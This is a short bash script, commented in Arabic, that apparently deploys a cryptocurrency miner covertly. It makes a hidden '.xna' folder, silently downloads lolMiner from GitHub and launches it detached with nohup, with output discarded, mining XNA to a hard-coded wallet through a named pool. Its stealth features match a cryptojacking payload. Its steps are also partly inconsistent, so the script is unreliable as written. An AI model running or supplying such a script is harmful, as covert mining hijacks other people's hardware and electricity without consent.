#!/bin/bash

# الانتقال إلى المنزل وإنشاء مجلد خفي
cd ~
mkdir -p .xna && cd .xna

# تحميل LolMiner بصمت
wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82/lolMiner_v1.82_Lin64.tar.gz

# فك الضغط بصمت
tar -xvf lolMiner_v1.82_Lin64.tar.gz --strip=1
cd 1.82

# عنوان المحفظة (استبدله بعنوانك)
WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"
WORKER="gpu_worker"
POOL="stratum+tcp://stratum-na.rplant.xyz:7029"

# تشغيل LolMiner فقط على GPU بصمت
nohup ./lolMiner --coin XNA --pool stratum+tcp://stratum-na.rplant.xyz:7029 --user NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT --mode mining > /dev/null 2>&1 &

